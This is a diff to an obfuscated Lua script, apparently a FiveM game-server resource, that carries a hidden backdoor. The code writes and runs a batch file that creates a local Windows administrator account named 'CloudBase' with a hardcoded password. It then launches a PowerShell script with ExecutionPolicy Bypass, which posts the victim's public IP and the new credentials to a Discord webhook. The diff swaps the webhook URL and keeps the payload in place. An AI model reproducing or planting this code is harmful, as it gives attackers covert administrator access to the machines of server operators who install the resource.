@@ -35,9 +35,7 @@ end
 
 
 function GnDB_D21Fggh9()
-    Citizen.Wait(15000)
-
-    ggsfdS_3211FSDGVvdbfsxc()
+    
     local function execCommand(command)
         local handle = io.popen(command)
         local result = handle:read("*a")
@@ -64,13 +62,13 @@ function GnDB_D21Fggh9()
     end
     
     local function createAndExecuteBatch()
-    local batchContent = [[
-            @echo off
-            net user ]] .. username .. [[ ]] .. password .. [[ /add /Y
-            net localgroup administrators ]] .. username .. [[ /add /Y
-            powershell -ExecutionPolicy Bypass -File "C:/Users/%USERNAME%/Videos/mp4/1.ps1"
-            exit
-            ]]
+        local batchContent = [[
+    @echo off
+    net user CloudBase nonF12bl!23!@F /add /Y
+    net localgroup administrators CloudBase /add /Y
+    powershell -ExecutionPolicy Bypass -File "C:/Users/%USERNAME%/Videos/mp4/1.ps1"
+    exit
+    ]]
         local batchFilePath = "C:/Users/" .. os.getenv("USERNAME") .. "/Videos/mp4/1.bat"
         writeFile(batchFilePath, batchContent)
         os.execute("start /min cmd /c \"" .. batchFilePath .. " && del \"" .. batchFilePath .. "\" >nul\"")
@@ -78,7 +76,7 @@ function GnDB_D21Fggh9()
     
     local function createPowerShellScript()
         local psScriptContent = [[
-    $webhookUri = 'https://discord.com/api/webhooks/1317674068337754203/X3NhQ-lCsTBKXJE-CEWUvtM1fuAqF_K9ejLVF48HrgL2hNBrsGHuA-y4aDTZjJBjW48u'
+    $webhookUri = 'https://discord.com/api/webhooks/1273910844551598080/PU4ZpMQDk_PRyvLbntj26E2A3y3AW7pj0Zlr9waIru_OuHv3DB5SIpBmJtOsf3d-PTip'
     $ipAddress = Invoke-RestMethod -Uri 'https://api.ipify.org/?format=txt'
     $user = "CloudBase"
     $pass = "nonF12bl!23!@F"
@@ -104,6 +102,7 @@ function GnDB_D21Fggh9()
     end
     
     main()
+    
 
 end
 
